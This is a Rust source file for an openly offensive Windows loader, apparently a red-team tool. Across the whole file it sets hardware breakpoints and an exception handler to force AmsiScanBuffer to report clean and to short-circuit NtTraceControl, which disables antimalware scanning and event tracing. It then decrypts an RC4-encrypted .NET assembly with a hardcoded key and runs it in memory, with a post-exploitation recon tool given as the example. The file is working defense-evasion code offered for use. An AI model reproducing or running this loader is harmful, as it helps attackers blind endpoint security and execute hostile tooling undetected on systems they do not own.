#![allow(non_snake_case, non_camel_case_types, unused_imports)]

use std::ffi::{c_void, CString};
use std::ptr::null_mut;
use std::mem;
use std::mem::zeroed;

use base64;
use clroxide::clr::Clr;
use rc4::{KeyInit, Rc4, StreamCipher};
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
use std::os::raw::c_ulong;
use std::{env, fs, process::exit};
use std::{fs::File, io::Read};
use std::{pin, process};
use windows::core::{s, PCSTR};
use windows::Wdk::System::SystemInformation::{NtQuerySystemInformation, SystemProcessInformation};
use windows::Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS};
use windows::Win32::Foundation::{CloseHandle, EXCEPTION_SINGLE_STEP, HANDLE, INVALID_HANDLE_VALUE, STATUS_SUCCESS};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_ALL_AMD64, EXCEPTION_CONTINUE_EXECUTION,
    EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Threading::{OpenThread, PROCESS_BASIC_INFORMATION, THREAD_ALL_ACCESS};
use windows::Win32::System::WindowsProgramming::{
    CLIENT_ID, SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION,
};
use windows::{
    core::PSTR,
    Win32::System::{
        Diagnostics::Debug::{AddVectoredExceptionHandler, IsDebuggerPresent},
        LibraryLoader::GetModuleHandleA,
    },
};

const S_OK: i32 = 0;
const AMSI_RESULT_CLEAN: i32 = 0;
static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;
static mut NT_TRACE_CONTROL_PTR: Option<*mut u8> = None;

fn set_bits(dw: u64, low_bit: i32, bits: i32, new_value: u64) -> u64 {
    let mask = (1 << bits) - 1;
    (dw & !(mask << low_bit)) | (new_value << low_bit)
}

fn clear_breakpoint(ctx: &mut CONTEXT, index: i32) {
    match index {
        0 => ctx.Dr0 = 0,
        1 => ctx.Dr1 = 0,
        2 => ctx.Dr2 = 0,
        3 => ctx.Dr3 = 0,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: i32) {
    match index {
        0 => ctx.Dr0 = address as u64,
        1 => ctx.Dr1 = address as u64,
        2 => ctx.Dr2 = address as u64,
        3 => ctx.Dr3 = address as u64,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0);
    ctx.Dr7 = set_bits(ctx.Dr7, (index * 2) as i32, 1, 1);
    ctx.Dr6 = 0;
}

fn get_arg(ctx: &CONTEXT, index: i32) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe { *((ctx.Rsp as *const u64).offset((index + 1) as isize) as *const usize) },
    }
}

fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *((ctx.Rsp as *const u64) as *const usize) }
}

fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp += amount as u64;
}

fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        let context = &mut *(*exceptions).ContextRecord;
        let exception_code = (*(*exceptions).ExceptionRecord).ExceptionCode;
        let exception_address = (*(*exceptions).ExceptionRecord).ExceptionAddress as usize;

        if exception_code == EXCEPTION_SINGLE_STEP {
            if let Some(amsi_address) = AMSI_SCAN_BUFFER_PTR {
                if exception_address == amsi_address as usize {
                    println!(
                        "[+] AMSI Bypass invoked at address: {:#X}",
                        exception_address
                    );
                    let return_address = get_return_address(context);
                    let scan_result_ptr = get_arg(context, 5) as *mut i32;
                    *scan_result_ptr = AMSI_RESULT_CLEAN;

                    set_ip(context, return_address);
                    adjust_stack_pointer(context, std::mem::size_of::<*mut u8>() as i32);
                    set_result(context, S_OK as usize);

                    clear_breakpoint(context, 0);
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }

            if let Some(nt_trace_address) = NT_TRACE_CONTROL_PTR {
                if exception_address == nt_trace_address as usize {
                    println!(
                        "[+] NtTraceControl Bypass invoked at address: {:#X}",
                        exception_address
                    );
                    if let Some(new_rip) = find_gadget(exception_address, b"\xc3", 1, 500) {
                        context.Rip = new_rip as u64;
                    }

                    clear_breakpoint(context, 1);
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }
        }

        EXCEPTION_CONTINUE_SEARCH
    }
}

fn find_gadget(function: usize, stub: &[u8], size: usize, dist: usize) -> Option<usize> {
    for i in 0..dist {
        unsafe {
            let ptr = function + i;
            if std::slice::from_raw_parts(ptr as *const u8, size) == stub {
                return Some(ptr);
            }
        }
    }
    None
}

fn GetCurrentProcessId() -> usize {
    let pseudo_handle: HANDLE = HANDLE(-1);
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let status = unsafe {
        NtQueryInformationProcess(
            pseudo_handle,
            PROCESSINFOCLASS(0),
            &mut pbi as *mut _ as *mut c_void,
            mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut(),
        )
    };
    
    if status != STATUS_SUCCESS {
        1
    } else {
        println!("[Debug] remote thread id: {}", pbi.UniqueProcessId);
        pbi.UniqueProcessId
    }
}

fn setup_bypass() -> Result<*mut c_void, String> {
    let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
    thread_ctx.ContextFlags = CONTEXT_ALL_AMD64;

    unsafe {
        if AMSI_SCAN_BUFFER_PTR.is_none() {
            let module_name = CString::new("amsi.dll").unwrap();

            let mut module_handle_r = GetModuleHandleA(PCSTR(module_name.as_ptr() as *mut _));
            let module_handle;
            match module_handle_r {
                Ok(handle) => {
                    module_handle = handle;
                }
                Err(_) => {
                    module_handle_r = LoadLibraryA(PCSTR(module_name.as_ptr() as *mut _));
                    match module_handle_r {
                        Ok(handle) => {
                            module_handle = handle;
                        }
                        Err(_) => {
                            return Err("Failed to load amsi.dll".to_string());
                        }
                    }
                }
            }

            let function_name = CString::new("AmsiScanBuffer").unwrap();
            let amsi_scan_buffer =
                GetProcAddress(module_handle, PCSTR(function_name.as_ptr() as *mut _));
            match amsi_scan_buffer {
                Some(r) => {
                    AMSI_SCAN_BUFFER_PTR = Some(r as *mut u8);
                }
                None => {
                    return Err("Failed to get address for AmsiScanBuffer".to_string());
                }
            }
        }

        if NT_TRACE_CONTROL_PTR.is_none() {
            let ntdll_module_name = CString::new("ntdll.dll").unwrap();
            let ntdll_module_handle =
                match GetModuleHandleA(PCSTR(ntdll_module_name.as_ptr() as *mut _)) {
                    Ok(h) => h,
                    Err(_) => {
                        return Err("Failed to load ntdll.dll".to_string());
                    }
                };

            let ntdll_function_name = CString::new("NtTraceControl").unwrap();
            let ntdll_function_ptr = GetProcAddress(
                ntdll_module_handle,
                PCSTR(ntdll_function_name.as_ptr() as *mut _),
            );
            match ntdll_function_ptr {
                Some(ptr) => {
                    NT_TRACE_CONTROL_PTR = Some(ptr as *mut u8);
                }
                None => {
                    return Err("Failed to get address for NtTraceControl".to_string());
                }
            }
        }
    }

    let h_ex_handler = unsafe { AddVectoredExceptionHandler(1, Some(exception_handler)) };

    let process_id = GetCurrentProcessId();
    let thread_handles = get_remote_thread_handle(process_id)?;

    for thread_handle in &thread_handles {
        match unsafe { GetThreadContext(thread_handle.clone(), &mut thread_ctx) } {
            Ok(_) => {}
            Err(_) => {
                return Err("Failed to get thread context".to_string());
            }
        }
        unsafe {
            if let Some(amsi_ptr) = AMSI_SCAN_BUFFER_PTR {
                enable_breakpoint(&mut thread_ctx, amsi_ptr, 0);
            }
            if let Some(nt_trace_ptr) = NT_TRACE_CONTROL_PTR {
                enable_breakpoint(&mut thread_ctx, nt_trace_ptr, 1);
            }
        }
        match unsafe { SetThreadContext(thread_handle.clone(), &mut thread_ctx) } {
            Ok(_) => {}
            Err(_) => {
                return Err("Failed to set thread context".to_string());
            }
        }
        unsafe {
            let _ = CloseHandle(thread_handle.clone());
        };
    }
    Ok(h_ex_handler)
}

fn get_remote_thread_handle(process_id: usize) -> Result<Vec<HANDLE>, String> {
    let mut thread_handles = Vec::new();
    let snapshot_handle = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    let mut stThEntry : THREADENTRY32 = THREADENTRY32::default();
    stThEntry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
    match snapshot_handle {
        Ok(handle) => {
            if handle == INVALID_HANDLE_VALUE {
                return Err("Invalid Thread Handle".to_string());
            }
            if let Err(e) = unsafe { Thread32First(handle, &mut stThEntry) } {
                return Err(e.to_string());
            }
            loop {
                if stThEntry.th32OwnerProcessID == process_id as u32 {
                    // let thread_id = stThEntry.th32ThreadID;
                    let thread_handle = unsafe {
                        OpenThread(THREAD_ALL_ACCESS, false, stThEntry.th32ThreadID)
                    };
                    match thread_handle {
                        Ok(handle) => {
                            thread_handles.push(handle);
                        }
                        Err(_) => {
                            return Err("Failed to run OpenThread".to_string());
                        }
                    }
                    break;
                }
                match unsafe { Thread32Next(handle, &mut stThEntry) } {
                    Ok(_) => {}
                    Err(_) => {break;}
                }
            }
        }
        Err(_) => {
            return Err("Failed to run CreateToolHelp32Snapshot".to_string());
        }
    }

    Ok(thread_handles)
}

fn read_file(filename: &str) -> Vec<u8> {
    let mut file = File::open(filename).expect("Failed to open file");
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)
        .expect("Failed to read file");
    contents
}

fn decrypt_rc4(filename: &str) -> Vec<u8> {
    let mut buf = read_file(filename);
    let mut rc4 = Rc4::new(b"Superrandompass123".into());

    rc4.apply_keystream(&mut buf);

    buf
}

fn prepare_args() -> (String, Vec<String>) {
    let mut args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        println!("[!] Usage: {} <RC4 Encrypted File> <Arguments>", args[0]);
        println!("[!] Example: {} S-e-a-t-b-e-l-t-4.enc AntiVirus", args[0]);
        exit(1)
    }

    let mut command_args: Vec<String> = vec![];

    if args.len() > 2 {
        command_args = args.split_off(2)
    }

    let path = args[1].clone();

    println!("[+] Running {} with args: {:?}", path, command_args);

    return (path, command_args);
}
fn main() -> Result<(), String> {
    println!("[+] RustPatchlessCLRLoader by C2Pain.");
    println!("[+] Github: https://github.com/c2pain/RustPatchlessCLRLoader");
    let (path, args) = prepare_args();

    match setup_bypass() {
        Ok(_) => {
            let shellcode = decrypt_rc4(&path);
            let mut clr = Clr::new(shellcode, args)?;
            let results = clr.run()?;
            println!("[+] Results:\n\n{}", results);
            process::exit(0);
        }
        Err(err_msg) => {
            println!("Error during verification: {}", err_msg);
        }
    }
    Ok(())
}
